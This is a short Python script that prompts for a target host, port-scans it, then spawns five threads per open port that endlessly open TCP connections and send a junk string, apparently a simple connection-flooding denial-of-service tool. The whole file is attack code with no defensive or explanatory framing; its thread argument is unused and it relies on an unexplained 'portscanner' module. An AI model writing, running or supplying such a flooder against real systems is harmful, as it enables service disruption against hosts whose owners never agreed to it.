import os
import socket
import sys
import threading
import portscanner
os.system("cls")
host = input("\nEnter host: ")
print("PortScanning\n")
ports = portscanner.scan(host)
print(ports)
def run(h, port):
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        s.send("svjbkdsvkudskubvdsukbvkdsbvbuvsb".encode())
        print("Packet send to " + host)
        s.close()
for x in ports:
    for i in range(5):
        t = threading.Thread(target=run, args=[i, x])
        t.start()
